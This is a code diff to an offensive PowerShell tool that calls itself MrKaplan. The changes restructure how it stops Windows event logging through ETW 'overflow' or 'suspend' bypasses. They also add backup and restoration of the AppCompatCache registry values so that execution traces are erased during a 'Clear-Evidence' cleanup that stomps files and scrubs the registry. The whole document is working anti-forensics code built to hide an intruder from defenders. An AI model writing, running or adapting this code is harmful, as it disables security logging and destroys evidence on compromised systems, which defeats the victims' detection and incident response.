@@ -50,45 +50,56 @@ function New-Config {
     }
 
     # Stopping the event logging.
-    if (!$runAsUser -and -not $exclusions.Contains("eventlogs")) {
+    if (-not $runAsUser) {
         $configFile["runAsUser"] = $false
-        Write-Host "[*] Stopping event logging..." -ForegroundColor Blue
 
-        if ($etwBypassMethod -eq "overflow") {
-            Write-Host "[*] This method won't allow any regular user to log in until you end MrKaplan." -ForegroundColor Yellow
+        if (-not $exclusions.Contains("eventlogs")) {
+            Write-Host "[*] Stopping event logging..." -ForegroundColor Blue
 
-            if ($(Read-Host "Are you sure? [y/n]") -eq "y") {
-                $etwMetadata = Get-EventLogsSettings
+            if ($etwBypassMethod -eq "overflow") {
+                Write-Host "[*] This method won't allow any regular user to log in until you end MrKaplan." -ForegroundColor Yellow
+
+                if ($(Read-Host "Are you sure? [y/n]") -eq "y") {
+                    $etwMetadata = Get-EventLogsSettings
+
+                    if ($etwMetadata.Count -eq 0) {
+                        return $false
+                    }
+                    
+                    $configFile["EventLogSettings"] = $etwMetadata
+                    if (!$(Clear-EventLogging)) {
+                        return $false
+                    }
+                }
+                else {
+                    Write-Host "[-] Exiting..." -ForegroundColor Red
+                    return $false
+                }
+            }
+            elseif ($etwBypassMethod -eq "suspend" -or $etwBypassMethod -eq "") {
+                $etwMetadata = Invoke-SuspendEtw
 
                 if ($etwMetadata.Count -eq 0) {
                     return $false
                 }
-                
-                $configFile["EventLogSettings"] = $etwMetadata
-                if (!$(Clear-EventLogging)) {
-                    return $false
-                }
+
+                $configFile["EventLogSettings"] = $etwMetadata[1]
             }
             else {
-                Write-Host "[-] Exiting..." -ForegroundColor Red
-                return $false
-            }
-        }
-        elseif ($etwBypassMethod -eq "suspend" -or $etwBypassMethod -eq "") {
-            $etwMetadata = Invoke-SuspendEtw
-
-            if ($etwMetadata.Count -eq 0) {
+                Write-Host "[-] Unknown ETW patching method, exiting..." -ForegroundColor Red
                 return $false
             }
 
-            $configFile["EventLogSettings"] = $etwMetadata[1]
+            Write-Host "[+] Stopped event logging." -ForegroundColor Green
         }
-        else {
-            Write-Host "[-] Unknown ETW patching method, exiting..." -ForegroundColor Red
-            return $false
-        }
+        $configFile["AppCompatCache"] = @{}
 
-        Write-Host "[+] Stopped event logging." -ForegroundColor Green
+        if (-not $exclusions.Contains("appcompatcache")) {
+            $appCompatCacheKey = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
+            $configFile["AppCompatCache"]["AppCompatCache"] = [System.Convert]::ToBase64String($appCompatCacheKey.AppCompatCache)
+            $configFile["AppCompatCache"]["CacheMainSdb"] = [System.Convert]::ToBase64String($appCompatCacheKey.CacheMainSdb)
+            $configFile["AppCompatCache"]["SdbTime"] = [System.Convert]::ToBase64String($appCompatCacheKey.SdbTime)
+        }
     }
     else {
         $configFile["runAsUser"] = $true
@@ -172,7 +183,7 @@ function Clear-Evidence {
     Invoke-StompFiles $configFile["files"]
 
     foreach ($user in $configFile.Keys) {
-        if ($user -eq "time" -or $user -eq "EventLogSettings" -or $user -eq "Exclusions" -or $user -eq "runAsUser") {
+        if ($user -eq "time" -or $user -eq "EventLogSettings" -or $user -eq "Exclusions" -or $user -eq "runAsUser" -or $user -eq "AppCompatCache") {
             continue
         }
 
@@ -184,7 +195,7 @@ function Clear-Evidence {
         }
     }
 
-    if (!$(Clear-Registry $configFile["time"] $users $runAsUser $configFile["Exclusions"])) {
+    if (!$(Clear-Registry $configFile["time"] $users $runAsUser $configFile["Exclusions"] $configFile["AppCompatCache"])) {
         Write-Host "[-] Failed to cleanup the registry." -ForegroundColor Red
         $result = $false
     }
